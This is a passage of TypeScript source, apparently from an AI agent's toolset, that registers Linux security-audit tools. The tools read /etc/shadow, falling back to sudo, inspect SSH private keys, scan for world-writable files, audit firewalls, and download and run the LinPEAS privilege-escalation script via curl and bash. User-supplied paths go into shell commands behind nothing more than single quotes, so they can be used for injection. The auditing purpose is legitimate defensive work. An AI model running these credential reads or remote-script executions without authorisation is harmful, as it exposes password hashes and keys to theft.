      out.push(`\n━━━━ 匹配结果 ━━━━`);
      const matched = exploits.filter((e) => e.match());
      if (matched.length === 0) {
        out.push(`✓ 在内置表中未匹配到明确漏洞（${exploits.length} 条 CVE）。可能：版本太新、表未覆盖、或需检查发行版 backport。`);
      } else {
        out.push(`🚨 匹配到 ${matched.length} 个可能受影响的 exploit，按严重度：`);
        matched.sort((a, b) => (a.severity === b.severity ? 0 : a.severity === "CRITICAL" ? -1 : 1));
        for (const e of matched) {
          const sevColor = e.severity === "CRITICAL" ? "🟥 CRITICAL" : e.severity === "HIGH" ? "🟧 HIGH" : "🟨 MEDIUM";
          out.push(
            `\n  ── ${sevColor} ──\n` +
            `  CVE        : ${e.cve}\n` +
            `  名称       : ${e.name}\n` +
            `  影响范围   : ${e.range}\n` +
            `  说明       : ${e.description}\n` +
            `  PoC/参考   : ${e.poc}`
          );
        }
      }

      out.push(`\n📌 说明:\n  - 仅做版本范围匹配，发行版可能已 backport 安全补丁（见 /usr/share/doc/*/changelog.Debian.gz）。\n  - 容器内部分漏洞依赖 user namespace / cgroup v1 / eBPF JIT 等开关，建议用 linpeas 进一步确认。\n  - PoC 仅供授权环境验证，严禁未授权使用。`);
      return out.join("\n");
    },
  });

  registry.register({
    name: "file_permission_audit",
    description: "Linux 关键文件权限审计：/etc/shadow、SSH 公私钥/authorized_keys、全局可写文件",
    parameters: z.object({
      mode: z
        .enum(["shadow", "ssh_key", "world_writable", "all"])
        .default("all")
        .describe("审计模式：shadow=影子密码, ssh_key=SSH密钥权限, world_writable=全局可写, all=全部"),
      root_path: z.string().optional().default("/").describe("world_writable 扫描根路径，默认 /"),
      scan_depth: z.number().min(1).max(5).optional().default(3).describe("world_writable find -maxdepth 深度 1-5，默认 3"),
    }),
    category: "linux",
    concurrent: true,
    execute: async (args: any) => {
      const { mode, root_path = "/", scan_depth = 3 } = args;
      const out: string[] = [`[关键文件权限审计] 模式=${mode} root=${root_path} depth=${scan_depth}\n`];
      const modesToRun = mode === "all" ? ["shadow", "ssh_key", "world_writable"] : [mode];

      for (const m of modesToRun) {
        if (m === "shadow") {
          out.push(`\n═══ /etc/shadow 审计 ═══`);
          try {
            let shadowContent = "";
            try {
              shadowContent = fs.readFileSync("/etc/shadow", "utf-8");
            } catch (err: any) {
              out.push(`  ⚠️ 无法直接读取 /etc/shadow（通常只允许 root）：${err.message}`);
              try {
                shadowContent = runCmd("sudo cat /etc/shadow 2>/dev/null", 5000);
              } catch {}
            }
            if (!shadowContent.trim()) {
              out.push(`  (无法获取 shadow 内容，跳过解析)`);
              continue;
            }
            const lines = shadowContent.split("\n").filter((l) => l.trim());
            const stats: Record<string, number> = { MD5: 0, bcrypt: 0, SHA256: 0, SHA512: 0, yescrypt: 0, 空密码: 0, 锁定: 0, 未知: 0 };
            const warns: string[] = [];
            for (const line of lines) {
              const cols = line.split(":");
              if (cols.length < 2) continue;
              const user = cols[0];
              const hash = cols[1];
              if (hash === "" || hash == null) {
                stats["空密码"]++;
                warns.push(`  🚨 用户 [${user}] 密码字段为空！任何人无需密码即可登录！`);
                continue;
              }
              if (hash.startsWith("!") || hash.startsWith("*")) {
                stats["锁定"]++;
                continue;
              }
              if (hash.startsWith("$y$") || hash.startsWith("$7$")) stats["yescrypt"]++;
              else if (hash.startsWith("$6$")) stats["SHA512"]++;
              else if (hash.startsWith("$5$")) stats["SHA256"]++;
              else if (hash.startsWith("$2")) stats["bcrypt"]++;
              else if (hash.startsWith("$1$")) stats["MD5"]++;
              else stats["未知"]++;
              if (hash.startsWith("$1$")) {
                warns.push(`  ⚠️ 用户 [${user}] 使用 MD5($1$) 哈希，已过时，建议升级到 yescrypt/SHA512`);
              }
            }
            out.push(`  用户数: ${lines.length}\n  哈希类型统计: ${JSON.stringify(stats)}`);
            if (warns.length) out.push(`\n  🚨 警告项（${warns.length}）:\n` + warns.join("\n"));
          } catch (err: any) {
            out.push(`  ❌ 失败: ${err.message}`);
          }
        }

        if (m === "ssh_key") {
          out.push(`\n═══ SSH 密钥审计 ═══`);
          const homes: string[] = [];
          try {
            homes.push("/root");
            const etcPasswd = fs.readFileSync("/etc/passwd", "utf-8");
            for (const line of etcPasswd.split("\n")) {
              const parts = line.split(":");
              if (parts.length >= 6 && parts[5].startsWith("/home/")) homes.push(parts[5]);
              if (parts.length >= 1 && parts[0] === "root" && !homes.includes("/root")) homes.unshift("/root");
            }
          } catch {}
          const userHome = process.env.HOME;
          if (userHome && !homes.includes(userHome)) homes.push(userHome);

          const allWarns: string[] = [];
          const allInfo: string[] = [];
          for (const home of homes) {
            const sshDir = `${home}/.ssh`;
            if (!fs.existsSync(sshDir)) continue;
            allInfo.push(`\n  ── ${sshDir} ──`);
            const candidates = ["id_rsa", "id_rsa.pub", "id_ecdsa", "id_ecdsa.pub", "id_ed25519", "id_ed25519.pub", "id_dsa", "id_dsa.pub", "authorized_keys", "config", "known_hosts"];
            for (const fn of candidates) {
              const fp = `${sshDir}/${fn}`;
              if (!fs.existsSync(fp)) continue;
              try {
                const st = fs.statSync(fp);
                const mode = st.mode & 0o777;
                const isPriv = /^id_(rsa|ecdsa|ed25519|dsa)$/.test(fn) && !fn.endsWith(".pub");
                const isPub = fn.endsWith(".pub");
                const isAuth = fn === "authorized_keys";
                let expectModeStr = "";
                let bad = false;
                if (isPriv && mode !== 0o600) { bad = true; expectModeStr = "  期望 0600"; }
                if (isPub && mode !== 0o644) { bad = true; expectModeStr = "  期望 0644"; }
                if (isAuth && mode !== 0o600) { bad = true; expectModeStr = "  期望 0600"; }
                const line = `    ${fn}  权限=${mode.toString(8).padStart(3, "0")}  大小=${st.size}B${bad ? "  ❌权限错误" : expectModeStr}`;
                if (bad) allWarns.push(line); else allInfo.push(line);

                if (isPriv) {
                  try {
                    const head = fs.readFileSync(fp, "utf-8").split("\n").slice(0, 3).join("\n");
                    if (!/ENCRYPTED/.test(head) && /BEGIN (RSA|OPENSSH|EC|DSA) PRIVATE KEY/.test(head)) {
                      allWarns.push(`      🚨 未加密私钥！(缺少 ENCRYPTED 头) → ${fp}`);
                    } else if (/ENCRYPTED/.test(head)) {
                      allInfo.push(`      ✓ 私钥已加密`);
                    }
                  } catch {}
                }
              } catch {}
            }
          }
          if (allWarns.length) out.push(`🚨 SSH 密钥问题（${allWarns.length}）:\n` + allWarns.join("\n"));
          else out.push(`  ✓ SSH 目录权限全部正常`);
          out.push(allInfo.join("\n"));
        }

        if (m === "world_writable") {
          out.push(`\n═══ 全局可写文件扫描 (${root_path}, depth=${scan_depth}, 最多100条) ═══`);
          try {
            const cmd = `find '${root_path}' -maxdepth ${scan_depth} -type f -perm -0002 ! -type l 2>/dev/null | head -n 100`;
            const raw = runCmd(cmd, 60000);
            const lines = raw.split("\n").filter((l) => l.trim());
            out.push(`扫描到 ${lines.length} 个全局可写文件（other-writable）：\n`);
            const sensitive = lines.filter((l) =>
              /\/etc\/|\/usr\/bin\/|\/usr\/sbin\/|\/sbin\/|\/bin\/|\/root\/|^\/[a-z]+\.sh$|crontab|passwd|shadow|sudoers|profile|bashrc|init\.d|systemd|\.service$/.test(l)
            );
            if (sensitive.length) {
              out.push(`🚨 敏感路径下的全局可写（${sensitive.length}）：\n` + sensitive.map((x) => `  ⚠️ ${x}`).join("\n") + "\n");
            }
            out.push(lines.slice(0, 100).map((x) => `  • ${x}`).join("\n") + (lines.length >= 100 ? `\n  ... 已达到 100 条上限` : ""));
          } catch (err: any) {
            out.push(`  ❌ 失败: ${err.message}`);
          }
        }
      }

      return out.join("\n");
    },
  });

  registry.register({
    name: "firewall_network_audit",
    description: "防火墙/网络内核参数审计：iptables/ufw/nftables 规则汇总 + ip转发/源路由/反向过滤/rp_filter 风险摘要",
    parameters: z.object({
      mode: z
        .enum(["iptables", "ufw", "nftables", "forwarding", "all"])
        .default("all")
        .describe("模式：iptables/ufw/nftables/forwarding/all"),
    }),
    category: "linux",
    concurrent: true,
    execute: async (args: any) => {
      const { mode } = args;
      const out: string[] = [`[防火墙 + 网络内核参数审计] 模式=${mode}\n`];
      const modesToRun = mode === "all" ? ["iptables", "ufw", "nftables", "forwarding"] : [mode];

      for (const m of modesToRun) {
        if (m === "iptables") {
          out.push(`\n═══ iptables 规则 ═══`);
          if (!commandExists("iptables")) {
            out.push(`  ⚠️ iptables 命令未安装或不可用（可能非 root）`);
          } else {
            try {
              const s = runCmd("iptables -S 2>/dev/null | head -n 300", 10000);
              const lnv = runCmd("iptables -L -n -v 2>/dev/null | head -n 200", 10000);
              out.push(`── iptables -S（规则定义）──\n${s || "(空或无权限)"}`);
              out.push(`\n── iptables -L -n -v（计数链视图，前200）──\n${lnv || "(空或无权限)"}`);

              const warns: string[] = [];
              if (/INPUT\s+ACCEPT\s+\[/.test(lnv) || /-P\s+INPUT\s+ACCEPT/.test(s)) {
                warns.push("  ⚠️ INPUT 默认策略 ACCEPT（默认放行入站，风险高）");
              }
              if (/FORWARD\s+ACCEPT\s+\[/.test(lnv) || /-P\s+FORWARD\s+ACCEPT/.test(s)) {
                warns.push("  ⚠️ FORWARD 默认 ACCEPT（若开启 ip_forward，可作为跳板）");
              }
              if (/-A\s+INPUT\s+-p\s+tcp\s+-s\s+0\.0\.0\.0\/0\s+--dport\s+22\s+-j\s+ACCEPT/i.test(s)) {
                warns.push("  ⚠️ SSH 端口(22)对 0.0.0.0/0 全开放，建议限制来源IP");
              }
              const anyReject = /REJECT|DROP/.test(s);
              if (!anyReject && /INPUT\s+ACCEPT/.test(lnv)) {
                warns.push("  ⚠️ INPUT 无任何 REJECT/DROP 规则，相当于裸奔");
              }
              if (warns.length) out.push(`\n🚨 iptables 风险摘要（${warns.length}）：\n` + warns.join("\n"));
            } catch (err: any) {
              out.push(`  ❌ 失败: ${err.message}`);
            }
          }
        }

        if (m === "ufw") {
          out.push(`\n═══ UFW 状态 ═══`);
          if (!commandExists("ufw")) {
            out.push(`  ⚠️ ufw 未安装`);
          } else {
            try {
              const s = runCmd("ufw status verbose 2>/dev/null", 8000);
              out.push(s || "(无输出或无权限)");
              if (/Status: inactive/i.test(s)) {
                out.push(`🚨 UFW 当前未启用（Status: inactive）`);
              }
            } catch (err: any) {
              out.push(`  ❌ 失败: ${err.message}`);
            }
          }
        }

        if (m === "nftables") {
          out.push(`\n═══ nftables 规则 ═══`);
          if (!commandExists("nft")) {
            out.push(`  ⚠️ nft (nftables) 未安装`);
          } else {
            try {
              const s = runCmd("nft list ruleset 2>/dev/null | head -n 200", 10000);
              out.push(s || "(空规则或无权限)");
              if (!s.trim()) {
                out.push(`  ℹ️ 未加载任何 nftables 规则（可能依赖 iptables/ufw 或裸奔）`);
              }
            } catch (err: any) {
              out.push(`  ❌ 失败: ${err.message}`);
            }
          }
        }

        if (m === "forwarding") {
          out.push(`\n═══ 网络内核参数（转发/源路由/RP 过滤/ICMP）═══`);
          try {
            const s1 = runCmd("sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding 2>/dev/null", 5000);
            const s2 = runCmd("cat /proc/sys/net/ipv4/conf/all/accept_source_route /proc/sys/net/ipv4/conf/all/rp_filter /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts 2>/dev/null", 5000);
            out.push(`── sysctl ip_forward / ipv6.forwarding ──\n${s1}`);
            out.push(`\n── /proc/sys 三个值 (accept_source_route / rp_filter / icmp_echo_ignore_broadcasts) ──\n${s2}`);

            const risks: string[] = [];
            const fwdMatch = s1.match(/net\.ipv4\.ip_forward\s*=\s*(\d+)/);
            if (fwdMatch && fwdMatch[1] === "1") risks.push("  ⚠️ net.ipv4.ip_forward=1 已开启，本机可作为路由转发；若 INPUT/FORWARD 默认 ACCEPT 则极易被当跳板");
            const v6Match = s1.match(/net\.ipv6\.conf\.all\.forwarding\s*=\s*(\d+)/);
            if (v6Match && v6Match[1] === "1") risks.push("  ⚠️ net.ipv6.conf.all.forwarding=1 IPv6 转发已开启");
            const asrVals = s2.trim().split(/\s+/);
            const asr = asrVals[0];
            const rpf = asrVals[1];
            const icmpEcho = asrVals[2];
            if (asr === "1") risks.push("  ⚠️ accept_source_route=1 接受源路由（易被用于流量劫持/路径绕过），建议 0");
            if (rpf === "0") risks.push("  ⚠️ rp_filter=0 未启用反向路径过滤，易被 IP 欺骗 / 非对称路由误用，建议 1 或 2");
            if (icmpEcho === "0") risks.push("  📝 icmp_echo_ignore_broadcasts=0 响应广播 ICMP（可被用于 Smurf 放大攻击），建议 1");
            if (risks.length) out.push(`\n🚨 风险摘要（${risks.length}）：\n` + risks.join("\n"));
            else out.push(`\n✓ 未发现明显的内核网络参数风险`);
          } catch (err: any) {
            out.push(`  ❌ 失败: ${err.message}`);
          }
        }
      }

      return out.join("\n");
    },
  });

  registry.register({
    name: "linpeas_report",
    description: "LinPEAS 本地提权检查：支持下载运行/本地脚本运行/仅检查。自动提取 YELLOW/RED [Y]/[R] 高亮为摘要",
    parameters: z.object({
      mode: z
        .enum(["download_run", "local_run", "check"])
        .default("local_run")
        .describe("模式：download_run=从官方下载并运行, local_run=运行本地脚本, check=仅枚举已下载的PE脚本"),
      script_path: z.string().optional().describe("local_run 模式下的 linpeas.sh 路径"),
      output_path: z.string().optional().describe("输出日志文件保存路径，默认 /tmp/linpeas_$TIMESTAMP.log"),
    }),
    category: "linux",
    requirePermission: true,
    execute: async (args: any) => {
      const { mode, script_path, output_path } = args;
      const out: string[] = [`[LinPEAS 报告] 模式=${mode}\n`];
      const officialUrl = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh";
      const outFile = output_path || `/tmp/linpeas_${Date.now()}.log`;

      if (mode === "check") {
        out.push(`═══ 本地 PE 脚本检查 ═══`);
        const locations = [
          "/tmp/linpeas.sh",
          "/tmp/linpeas",
          "/var/tmp/linpeas.sh",
          "/dev/shm/linpeas.sh",
          "/opt/linpeas.sh",
          script_path || "",
        ].filter(Boolean);
        const found: string[] = [];
        for (const p of locations) {
          if (fs.existsSync(p)) {
            try {
              const st = fs.statSync(p);
              found.push(`  ✓ ${p}  (${st.size}B, mtime=${new Date(st.mtime).toISOString().slice(0, 19)})`);
            } catch {}
          }
        }
        if (found.length) out.push(`找到本地 PE 脚本（${found.length}）：\n` + found.join("\n"));
        else out.push(`未发现常见位置的 linpeas，建议 download_run 或指定 script_path。\n官方：${officialUrl}`);
        return out.join("\n");
      }

      let runTarget = "";
      if (mode === "download_run") {
        out.push(`═══ 下载 LinPEAS (${officialUrl}) 并运行 ═══`);
        runTarget = `/tmp/linpeas_${Date.now()}.sh`;
        if (!commandExists("curl") && !commandExists("wget")) {
          out.push(`❌ 未找到 curl / wget 无法下载`);
          return out.join("\n");
        }
        try {
          const cmd = commandExists("curl")
            ? `curl -fsSL -o '${runTarget}' '${officialUrl}' 2>&1`
            : `wget -q -O '${runTarget}' '${officialUrl}' 2>&1`;
          const dl = runCmd(cmd, 60000);
          if (!fs.existsSync(runTarget) || fs.statSync(runTarget).size < 50000) {
            out.push(`❌ 下载失败，输出：${truncate(dl, 800)}`);
            return out.join("\n");
          }
          fs.chmodSync(runTarget, 0o755);
          out.push(`  ✓ 下载完成: ${runTarget} (${fs.statSync(runTarget).size}B)`);
        } catch (err: any) {
          out.push(`❌ 下载异常: ${err.message}`);
          return out.join("\n");
        }
      } else {
        if (!script_path) {
          out.push(`❌ local_run 必须提供 script_path 参数`);
          return out.join("\n");
        }
        if (!fs.existsSync(script_path)) {
          out.push(`❌ 脚本不存在: ${script_path}`);
          return out.join("\n");
        }
        runTarget = script_path;
        out.push(`═══ 运行本地 LinPEAS: ${runTarget} ═══`);
      }

      try {
        const runCmdStr = `bash '${runTarget}' -a -q 2>&1 | tee '${outFile}' | head -n 2000`;
        const startTime = Date.now();
        const raw = runCmd(runCmdStr, 180000);
        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
        out.push(`  ✓ 运行完成，用时 ${elapsed}s，日志: ${outFile}\n`);

        const yRe = /(?:\x1b\[1;33m|\[Y\]|YELLOW|╠.*[!⚠])[^ \n]{0,2}([^\n]{0,220})/gi;
        const rRe = /(?:\x1b\[1;31m|\[R\]|RED|🚨|╔.*\╗)[^ \n]{0,2}([^\n]{0,260})/gi;
        const strip = (s: string) => s.replace(/\x1b\[[0-9;]*m/g, "").replace(/[\u2500-\u257F╔╗╚╝╠╣═║]/g, "").trim();
        const rawFull = fs.existsSync(outFile) ? fs.readFileSync(outFile, "utf-8") : raw;
        const rMatches = Array.from(rawFull.matchAll(rRe)).map((m) => strip(m[0])).filter((x) => x && x.length > 6);
        const yMatches = Array.from(rawFull.matchAll(yRe)).map((m) => strip(m[0])).filter((x) => x && x.length > 6 && !rMatches.includes(x));
        const uniq = (arr: string[]) => Array.from(new Set(arr)).slice(0, 80);

        out.push(`━━━━ 高亮摘要（[R]=严重 / [Y]=可疑，自动去重各取前 80）━━━━`);
        if (rMatches.length) {
          out.push(`\n🚨 [RED] 潜在严重提权点（${rMatches.length}）:\n` + uniq(rMatches).map((l) => `  • ${l}`).join("\n"));
        } else out.push(`\n  • 未发现 RED 类结果`);
        if (yMatches.length) {
          out.push(`\n🟡 [YELLOW] 可疑点（${yMatches.length}）:\n` + uniq(yMatches).map((l) => `  • ${l}`).join("\n"));
        } else out.push(`\n  • 未发现 YELLOW 类结果`);

        out.push(`\n━━━━ 原始输出（截断 2000 行 / 30KB）━━━━`);
        const display = fs.existsSync(outFile) ? fs.readFileSync(outFile, "utf-8") : raw;
        const lines = display.split("\n").slice(0, 2000).join("\n");
        out.push(truncate(lines, 30000));
      } catch (err: any) {
        out.push(`❌ 执行失败: ${err.message}`);
      }

      return out.join("\n");
    },
  });

  return registry;
}
